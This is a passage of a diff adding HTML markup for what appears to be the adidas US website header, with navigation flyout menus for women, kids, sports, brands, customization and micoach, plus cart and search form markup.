+<li><a href="http://www.adidas.com/us/women-basketball">Basketball</a></li>
+<li><a href="http://www.adidas.com/us/women-softball">Softball</a></li>
+<li><a href="http://www.adidas.com/us/women-tennis">Tennis</a></li>
+<li><a href="http://www.adidas.com/us/women-outdoor">Outdoor</a></li>
+<li><a href="http://www.adidas.com/us/skateboarding">Skateboarding</a></li>
+<li><a href="http://www.adidas.com/us/snowboarding">Snowboarding</a></li>
+<li><a href="http://www.adidas.com/us/women-lacrosse">Lacrosse</a></li>
+<li><a href="http://www.adidas.com/us/women-volleyball">Volleyball</a></li>
+<li><a href="http://www.adidas.com/us/women-yoga">Yoga</a></li>
+</ul>
+</div>
+
+</div>
+<div class="bottom-line">
+<!-- <div class="col-5">&nbsp;</div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/women-shoes"><strong>Shop all Women&#39;s Shoes</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/women-apparel"><strong>Shop all Women&#39;s Apparel</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/women-accessories"><strong>Shop all Women&#39;s Accesories</strong></a></div> -->
+<!-- <div class="col-5"><a href="http://www.adidas.com/us/women"><strong>Shop all Women&#39;s</strong></a></div> -->
+</div>
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+<div class="flyout navigation-gender-kids">
+<div class="nav-button">
+<a class="top-cat-link" href="http://www.adidas.com/us/kids">
+kids
+</a>
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-gender-kids" data-contentasset="navigation-gender-kids">
+<div class="flyout-content-in">
+    <div class="main-line">
+
+        <div class="col-5">
+            <div class="headline">featured</div>
+            <ul>
+                <li><a href="http://www.adidas.com/us/kids-new_arrivals">New Arrivals</a></li>
+                <li><a href="http://www.adidas.com/us/kids-best_sellers">Best Sellers</a></li>
+                <li><strong><a href="http://www.adidas.com/us/kids-sale">Sale - New Markdowns Added</a></strong></li>
+                <li>&nbsp;</li>
+                <li><a href="http://www.adidas.com/us/kids-back_to_school">Back to School</a></li>
+                <li><a href="http://www.adidas.com/us/kids-zne"> Z.N.E</a></li>
+                <li><a href="http://www.adidas.com/us/disney">Disney</a></li>
+                <li><a href="http://www.adidas.com/us/kids-iconics">Iconics</a></li>
+                <!-- <li class="horizontal-separator"></li> -->
+                <!-- <li><a href="http://www.adidas.com/us/kids-sale"><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dwd9a3010f/_other/_navigation/EOY_flyout.jpg" /></a></li> -->
+
+            </ul>
+        </div>
+
+        <div class="col-5">
+            <div class="headline"><a href="http://www.adidas.com/us/kids-infant_toddler">infants & toddlers<br>(0-3 years)</a>
+            </div>
+            <ul>
+                <li><a href="http://www.adidas.com/us/kids-infant_toddler-originals-shoes
+">Originals Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-infant_toddler-sport-shoes
+">Sport Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-infant_toddler-neo-shoes
+">Neo Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-infant_toddler-shoes
+">All Shoes</a>
+                </li>
+                <li class="horizontal-separator"></li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-jackets%7Cvests
+">Jackets & Vests</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-infant_toddler-hoodies
+">Hoodies & Sweatshirts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-track_suits
+">Track Suits & Warm Ups</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-short_sleeve_tops
+">Short Sleeve Tops</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-pants
+">Pants</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-shorts
+">Shorts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/infant_toddler-apparel
+">View All Apparel</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="col-5">
+            <div class="headline"><a href="http://www.adidas.com/us/children-search">Children<br>(4-8 years)</a>
+            </div>
+             <ul>
+                <li><a href="http://www.adidas.com/us/kids-children-originals-shoes
+">Originals Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-children-sport-shoes
+">Sport Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-children-neo-shoes
+">Neo Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-children-shoes
+">All Shoes</a>
+                </li>
+                <li class="horizontal-separator"></li>
+                <li><a href="http://www.adidas.com/us/children-jackets%7Cvests
+">Jackets & Vests</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-children-hoodies
+">Hoodies & Sweatshirts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/children-track_suits
+">Track Suits & Warm Ups</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/children-short_sleeve_tops
+">Short Sleeve Tops</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/children-pants
+">Pants</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/children-shorts
+">Shorts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/children-apparel
+">View All Apparel</a>
+                </li>
+            </ul>
+        </div>
+
+        <div class="col-5">
+            <div class="headline"><a href="http://www.adidas.com/us/youth-search">Youth<br>(8-14 years)</a>
+            </div>
+            <ul>
+                <li><a href="http://www.adidas.com/us/kids-youth-originals-shoes
+">Originals Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-youth-sport-shoes
+">Sport Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-youth-neo-shoes
+">Neo Shoes</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-youth-shoes
+">All Shoes</a>
+                </li>
+                <li class="horizontal-separator"></li>
+                <li><a href="http://www.adidas.com/us/youth-jackets%7Cvests
+">Jackets & Vests</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/kids-youth-hoodies
+">Hoodies & Sweatshirts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/youth-track_suits
+">Track Suits & Warm Ups</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/youth-short_sleeve_tops
+">Short Sleeve Tops</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/youth-pants
+">Pants</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/youth-shorts
+">Shorts</a>
+                </li>
+                <li><a href="http://www.adidas.com/us/youth-apparel
+">View All Apparel</a>
+                </li>
+            </ul>
+        </div>
+
+
+    </div>
+    <div class="bottom-line">
+        <div class="col-5">&nbsp;</div>
+        <div class="col-5"><a href="http://www.adidas.com/us/kids-infant_toddler"><strong>Shop all Infants & Toddlers</strong></a>
+        </div>
+        <div class="col-5"><a href="http://www.adidas.com/us/kids-children"><strong>Shop all Children</strong></a>
+        </div>
+        <div class="col-5"><a href="http://www.adidas.com/us/kids-youth"><strong>Shop all Youth</strong></a>
+        </div>
+    </div>
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+
+<span class="delimiter"></span>
+
+
+
+
+
+<div class="flyout navigation-category-sports">
+<div class="nav-button">
+
+sports
+
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-category-sports" data-contentasset="navigation-category-sports">
+<div class="flyout-content-in">
+<div class="main-line with-line">
+
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a href="http://www.adidas.com/us/running">running</a>
+    <a class="image-banner" href="http://www.adidas.com/us/running"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw2e59adfe/_other/_navigation/Running.png" style="width: 172px; height: 80px;" /> </a>
+</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/running-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/running-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/running-accessories">Accessories</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+        <li><a href="http://www.adidas.com/us/ultra_boost">Ultra Boost</a></li>
+  <li><a href="http://www.adidas.com/us/alphabounce?grid=true">AlphaBOUNCE</a></li>
+        <li><a href="http://www.adidas.com/us/pureboost_x?grid=true">PureBOOST X</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/running?grid=true"><strong>all Running</strong></a></li>
+  <!--<li><a href="http://www.adidas.com/us/running"><strong>Explore Running</strong></a></li>-->
+
+</ul>
+</div>
+
+
+<div class="col-5">
+<div class="headline">
+
+<a href="http://www.adidas.com/us/soccer">Soccer</a>
+<a class="image-banner" href="http://www.adidas.com/us/soccer"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw5bf4e7f9/adidascom_NavImage_Football_SOL_3Players_Suarez_Pogba.jpg" style="width: 172px; height: 80px;" /> </a>
+
+</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/soccer-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/soccer-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/soccer-accessories">Accessories</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+        <li><a href="http://www.adidas.com/us/ace?grid=true">Ace</a></li>
+        <li><a href="http://www.adidas.com/us/x?grid=true">X</a></li>
+        <li><a href="http://www.adidas.com/us/messi?grid=true">Messi</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/soccer?grid=true"><strong>all Soccer</strong></a></li>
+  <!--<li><a href="http://www.adidas.com/us/soccer"><strong>Explore Soccer</strong></a></li>-->
+
+</ul>
+</div>
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a href="http://www.adidas.com/us/basketball">basketball</a>
+    <a class="image-banner" href="http://www.adidas.com/us/basketball"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw2bdf187d/_other/_navigation/harden-basketball.png" style="width: 172px; height: 80px;" /> </a>
+</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/basketball-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/basketball-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/basketball-accessories">Accessories</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+        <li><a href="http://www.adidas.com/us/james_harden">James Harden</a></li>
+        <li><a href="http://www.adidas.com/us/damian_lillard">Damian Lillard</a></li>
+        <li><a href="http://www.adidas.com/us/crazylight">Crazylight Boost</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/basketball?grid=true"><strong>all Basketball</strong></a></li>
+  <!--<li><a href="http://www.adidas.com/us/basketball"><strong>Explore Basketball</strong></a></li>-->
+
+</ul>
+</div>
+
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a href="http://www.adidas.com/us/football">football</a>
+    <a class="image-banner" href="http://www.adidas.com/us/football"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dw4010a061/header-redesign/Football_Header.jpg" style="width: 172px; height: 80px;" /> </a>
+</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/football-cleats">Cleats</a></li>
+  <li><a href="http://www.adidas.com/us/football-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/football-accessories">Accessories</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+    <li><a href="http://www.adidas.com/us/cleathead">Cleathead</a></li>
+    <li><a href="http://www.adidas.com/us/football-collegiate">Collegiate</a></li>
+    <li><a href="http://www.adidas.com/us/adizero_5_star">Adizero 5-Star</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+    <li><a href="http://www.adidas.com/us/football?grid=true"><strong>all Football</strong></a></li>
+    <!--<li><a href="http://www.adidas.com/us/football"><strong>Explore Football</strong></a></li>-->
+
+</ul>
+</div>
+
+
+
+
+<div class="separate col-5">
+<div class="adidas-brand headline">other sports</div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/training">Training</a></li>
+        <li><a href="http://www.adidas.com/us/baseball">Baseball</a></li>
+  <li><a href="http://www.adidas.com/us/outdoor?grid=true">Outdoor</a></li>
+  <li><a href="http://www.adidas.com/us/skateboarding">Skateboarding</a></li>
+         <li><a href="http://www.adidas.com/us/snowboarding">Snowboarding</a></li>
+  <li><a href="http://www.adidas.com/us/hockey">Hockey</a></li>
+  <li><a href="http://www.adidas.com/us/tennis">Tennis</a></li>
+  <li><a href="http://adidasgolf.com/">Golf</a></li>
+        <li><a href="http://www.adidas.com/us/lacrosse">Lacrosse</a></li>
+ <li><a href="http://www.adidas.com/us/volleyball">Volleyball</a></li>
+ <li><a href="http://www.adidas.com/us/yoga">Yoga</a></li>
+</ul>
+</div>
+</div>
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+<div class="flyout navigation-category-labels">
+<div class="nav-button">
+
+brands
+
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-category-labels" data-contentasset="navigation-category-labels">
+<div class="flyout-content-in">
+<div class="main-line with-line">
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a class="image-logo" href="http://www.adidas.com/us/originals"><span style="display: none;">originals</span><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dwa369c7b5/_other/_navigation/text_originals.png" style="width: 172px; height: 30px;" /> </a>
+    <a class="image-banner" href="http://www.adidas.com/us/originals"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw05d3dd69/_other/_navigation/adidas-originals-fw15-header-flyout.jpg" style="width: 172px; height: 80px;" /> </a></div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/originals-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/originals-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/originals-accessories">Accessories</a></li>
+        <li><a href="http://www.adidas.com/us/originals-new_arrivals">New Arrivals</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/originals-superstar-shoes">Superstar</a></li>
+  <li><a href="http://www.adidas.com/us/stan_smith">Stan Smith</a></li>
+        <li><a href="http://www.adidas.com/us/gazelle">Gazelle</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/originals?grid=true"><strong> all adidas Originals</strong></a></li>
+  <!--<li><a href="http://www.adidas.com/us/originals"><strong>Explore Originals</strong></a></li>-->
+</ul>
+</div>
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a class="image-logo" href="http://www.adidas.com/us/athletics"><span style="display: none;">adidas by Stella McCartney</span><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dwe98fdae3/_other/_navigation/athletics-logo-172x30.png" style="width: 172px; height: 30px;" /> </a>
+    <a class="image-banner" href="http://www.adidas.com/us/athletics"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw1491338a/_other/_navigation/harden_172x80.jpg" style="width: 172px; height: 80px;" /> </a></div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/men-athletics">Men's Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/women-athletics">Women's Apparel</a></li>
+        <li><a href="http://www.adidas.com/us/kids-athletics">Kids Apparel </a></li>
+  <li><a href="http://www.adidas.com/us/new_arrivals-athletics">New Arrivals</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/zne">Z.N.E.</a></li>
+  <li><a href="http://www.adidas.com/us/icon">Icon</a></li>
+        <li><a href="http://www.adidas.com/us/essentials">Essentials</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/athletics-apparel?grid=true"><strong>all Athletics</strong></a></li>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a class="image-logo" href="http://www.adidas.com/us/adidas_by_stella_mccartney"><span style="display: none;">adidas by Stella McCartney</span><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw67e8598d/_other/_navigation/text_stella.png" style="width: 172px; height: 30px;" /> </a>
+    <a class="image-banner" href="http://www.adidas.com/us/adidas_by_stella_mccartney"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw9e2d96c8/_other/_navigation/aSMC category image_small.jpg" style="width: 172px; height: 80px;" /> </a></div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-apparel">Apparel</a></li>
+  <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-accessories">Accessories</a></li>
+        <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-new_arrivals">New Arrivals</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-tennis">Tennis</a></li>
+        <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney-training">Studio & Yoga</a></li>
+  <li><a href="http://www.adidas.com/us/stellasport">Stellasport</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney?grid=true"><strong>all adidas by Stella McCartney</strong></a></li>
+  <!-- <li><a href="http://www.adidas.com/us/adidas_by_stella_mccartney?grid=true"><strong>Explore adidas by Stella McCartney</strong></a></li> -->
+</ul>
+</div>
+
+<div class="col-5">
+<div class="adidas-brand headline">
+    <a class="image-logo" href="http://www.adidas.com/us/neo"><span style="display: none;">adidas Neo</span><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dwf1096fc4/_other/_navigation/text_neo.jpeg" style="width: 172px; height: 30px;" /> </a>
+    <a class="image-banner" href="http://www.adidas.com/us/neo"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dw55bebe00/_other/_navigation/041H_15_neo_SS16_Q2_Cont_Sports_navigation_header_R01.jpg" style="width: 172px; height: 80px;" /> </a></div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/neo-shoes">Shoes</a></li>
+        <li><a href="http://www.adidas.com/us/neo-apparel">Apparel</a></li>
+        <li><a href="http://www.adidas.com/us/neo-Accessories">Accessories</a></li>
+        <li><a href="http://www.adidas.com/us/neo-new_arrivals">New Arrivals</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/cloudfoam">Cloudfoam</a></li>
+  <li><a href="http://www.adidas.com/us/raleigh">Raleigh</a></li>
+        <li><a href="http://www.adidas.com/us/lite_racer">Lite Racer</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/neo?grid=true"><strong>all Neo</strong></a></li>
+  <!--<li><a href="http://www.adidas.com/us/neo"><strong>Explore NEO</strong></a></li>-->
+</ul>
+</div>
+
+<!--
+<div class="col-5">
+
+<div class="adidas-brand headline">
+    <a class="image-logo" href="http://www.adidas.com/us/skateboarding"><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dwf481b924/header-redesign/skate-icon.jpg" style="width: 172px; height: 30px;" /> </a>
+    <a class="image-banner" href="http://www.adidas.com/us/skateboarding"> <img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dw8c2c51ec/header-redesign/skate-logo.jpg" style="width: 172px; height: 80px;" /> </a></div>
+
+<ul>
+  <li><a href="http://www.adidas.com/us/skate?grid=true">adidas Skateboarding</a></li>
+  <li><a href="http://www.adidas.com/us/skate-shoes">Shoes</a></li>
+  <li><a href="http://www.adidas.com/us/skate-apparel">Apparel</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+  <li><a href="http://www.adidas.com/us/skate?grid=true">Shop all <strong>adidas Skateboarding</strong></a></li>
+  <li><a href="http://www.adidas.com/us/skateboarding">Explore <strong>adidas Skateboarding</strong></a></li>
+</ul>
+
+</div>
+-->
+
+<div class="separate col-5">
+<div class="adidas-brand headline">collections</div>
+
+<ul>
+        <li><a href="http://www.adidas.com/us/iconics">Iconics</a></li>
+         <li><a href="http://www.adidas.com/us/tubular">Tubular</a></li>
+        <li><a href="http://www.adidas.com/us/zx_flux">ZX Flux</a></li>
+        <li><a href="http://www.adidas.com/us/gazelle">Gazelle</a></li>
+  <li class="horizontal-separator">&nbsp;</li>
+<!--        <li><a href="http://www.adidas.com/us/stellasport">Stellasport</a></li> -->
+<!--        <li><a href="http://www.adidas.com/us/cloudfoam">Neo Cloudfoam</a></li> -->
+        <li><a href="http://www.adidas.com/us/adicolor">adicolor Apparel</a></li>
+        <li><a href="http://www.adidas.com/us/fashion_pack">Fashion Packs</a></li>
+</ul>
+</div>
+</div>
+
+<!-- <div class="bottom-line with-line">
+<div class="col-5"></div>
+<div class="col-5"></div>
+<div class="col-5"></div>
+<div class="col-5"></div>
+</div>
+-->
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+
+<span class="delimiter"></span>
+
+
+
+
+
+<div class="flyout navigation-services-customise">
+<div class="nav-button">
+<a class="top-cat-link" href="/us/customize">
+customize
+</a>
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-services-customise" data-contentasset="navigation-services-customise">
+<div class="flyout-content-in">
+<div class="main-line">
+
+<div class="col-5">
+<div class="headline">Featured</div>
+<ul>
+<div class="text-content">
+<li><a href="http://www.adidas.com/us/shoes-personalize">Personalize Shoes</a></li>
+<li><a href="http://www.adidas.com/us/apparel-personalize">Personalize Soccer Jerseys</a></li>
+<li class="horizontal-separator">&nbsp;</li>
+<li><a href="http://www.adidas.com/us/search?q=mi+pure+boost+zg">PureBoost ZG</a></li>
+<li><a href="http://www.adidas.com/us/search?q=mi+pure+boost+x">PureBoost X</a></li>
+<li><a href="http://www.adidas.com/us/search?q=mi+adizero+adios">adizero Adios 3</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=Tubular">Tubular</a></li>
+<li><a href="http://www.adidas.com/us/men-collegiate-originals-customizable">Collegiate Collection</a></li>
+</div>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline">Sports</div>
+<ul>
+<div class="text-content">
+<li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Soccer">Soccer</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Running">Running</a></li>
+<!-- <li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Football">Football</a></li> -->
+<li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Basketball">Basketball</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Training">Training</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=sport&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Football">Football</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=division&prefn2=sport&srule=Merch%20Sort%205%20%7C%20Aggregate%20Clicks%20in%203%20Days&prefv1=Sport&prefv2=Baseball">Baseball</a></li>
+</div>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline">Originals</div>
+<ul>
+<div class="text-content">
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=EQT">EQT</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=Superstar">Superstar</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=Stan%20Smith">Stan Smith</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Samba">Samba</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=collection&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Gazelle">Gazelle</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=division&prefn2=productLineStyle&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Originals&prefv2=adilette">adilette</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=ZX%20Flux">ZX Flux</a></li>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=Tubular">Tubular</a></li>
+</div>
+</ul>
+</div>
+
+<div class="col-5">
+<div class="headline"><a href=""></a></div>
+<ul>
+<li><a href="http://www.adidas.com/us/customize?prefn1=productLineStyle&prefv1=Stan%20Smith"><img alt="" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/en_US/dwbfdde768/_other/_navigation/Feature_Card_Single_Featurecard_PDP_Colors_Pattern_nav_flyout.jpg" /></a></li>
+
+</ul>
+</div>
+</div>
+
+<div class="bottom-line">
+<div class="col-5"><a href="http://www.adidas.com/us/customize?srule=Merch%20Sort%205%20%7C%20Aggregate%20Clicks%20in%203%20Days"><strong>View All Products</strong></a></div>
+<div class="col-5"><a href="http://www.adidas.com/us/customize?prefn1=division&srule=Merch%20Sort%205%20%7C%20Aggregate%20Clicks%20in%203%20Days&grid=true&prefv1=Sport"><strong>View All Sports Products</strong></a></div>
+<div class="col-5"><a href="http://www.adidas.com/us/customize?prefn1=division&srule=mi%20adidas%20Product%20Position%20Sort&prefv1=Originals"><strong>View all Originals Products</strong></a></div>
+<div class="col-5"><a href="http://www.adidas.com/us/customize?srule=Merch%20Sort%205%20%7C%20Aggregate%20Clicks%20in%203%20Days"><strong>View all Products</strong></a></div>
+</div>
+
+</div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+<div class="flyout navigation-services-micoach">
+<div class="nav-button">
+<a class="top-cat-link" href="/us/micoach">
+micoach
+</a>
+</div>
+
+
+<div class="flyout-content">
+
+
+
+
+
+
+<div class="contentasset" data-contentasset-id="navigation-services-micoach" data-contentasset="navigation-services-micoach">
+<div class="flyout-content-in">
+          <div class="col-2 attract-content">
+          <div class="main-container">
+          <div class="main-content">
+          <div class="headline"><a href="http://www.adidas.com/us/micoach" manual_cm_sp="header-_-micoach-_-gettrained">get trained</a></div>
+          <div class="text-content">Choose your training, get real-life coaching, read tips & tricks from pros and keep track of your performance.<br />micoach is all you need to get the results you want.  </div>
+          <ul class="links">
+          <li><a href="http://www.adidas.com/us/micoach" manual_cm_sp="header-_-micoach-_-moreaboutmicoach">More about micoach</a></li>
+          </ul>
+          </div>
+
+          <div class="image-content">
+          <a href="http://www.adidas.com/us/micoach" manual_cm_sp="header-_-micoach-_-gettrainedimage"><img style="width:200px; height: 185px" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dwa923d9da/header-redesign/flyout-miCoach-aware.jpg" alt="aware" /></a>
+          </div>
+          </div>
+          </div>
+
+
+          <div class="col-2 attract-content">
+          <div class="main-container">
+          <div class="main-content">
+          <div class="headline"><a href="http://www.adidas.com/us/micoach_collection" manual_cm_sp="header-_-micoach-_-micoachproducts">micoach products</a></div>
+          <div class="text-content">Whether you want to track your stats, play your music or measure your heart rate, our miCoach devices can monitor your every step - whatever your sport.</div>
+          <ul class="links">
+          <li><a href="http://www.adidas.com/us/micoach_collection" manual_cm_sp="header-_-micoach-_-viewallproducts" >Shop all products</a></li>
+          </ul>
+          </div>
+
+          <div class="image-content">
+          <a href="http://www.adidas.com/us/micoach_collection" manual_cm_sp="header-_-micoach-_-micoachproductsimage"><img style="width:200px; height: 185px" src="https://www.adidas.com/on/demandware.static/-/Sites-adidas-US-Library/default/dwb1116ae9/header-redesign/flyout-miCoach-products.jpg" alt="products" /></a>
+          </div>
+          </div>
+          </div>
+
+          </div>
+</div><!-- End contentasset -->
+
+
+
+
+
+</div>
+
+</div>
+
+
+
+
+
+
+
+
+      </div>
+      <div class="column utility">
+
+        <div id="minicart" class="minicart flyout" data-component="checkout/MiniCart">
+
+
+<div class="minicart-button">
+  <a class="minicarttotal" href="https://www.adidas.com/on/demandware.store/Sites-adidas-US-Site/en_US/Cart-Show" title="Checkout">
+    <strong></strong>
+
+  </a>
+</div>
+
+          <script id="emptyCartFlyout" type="text/template">
+            <div class="flyout-content empty-cart-msg">Your Bag is Empty</div>
+            </script>
+        </div>
+
+
+
+
+
+<div data-component="common/header/SearchRedesign,content/ExternalLinks,search/SearchField"
+data-suggestions="true"
+data-categories="false"
+data-products="true"
+data-min-chars="3"
+data-suggest-url="/on/demandware.store/Sites-adidas-US-Site/en_US/Search-GetSuggestions"
+data-linkscontext="search"
+class="sitesearch" id="site-search-redesigned">
+
+<div
+
+class="search-content-area header-fullwidth search-block"
+
+>
+<div class="searchinput-redesign">
+<a class="close">close <span class="icon-svg44"></span></a>
+
+<form action="https://www.adidas.com/us/search" method="get" id="simpleSearchFormRedesign" class="icon-svg38 simplesearch">
+<label for="searchInputRedesign" class="label-off">search</label>
+<input name="q" id="searchInputRedesign"
+class="searchinput-field-redesign" autocomplete="off"
+placeholder="search" />
+</form>
+</div>
+<div class="search-suggest clearfix " style="display:none;"><!-- Placeholder for suggestions --></div>
+<script type="text/template" id="simpleSearchSuggestRedesign">
+<div class="column-holder clearfix">
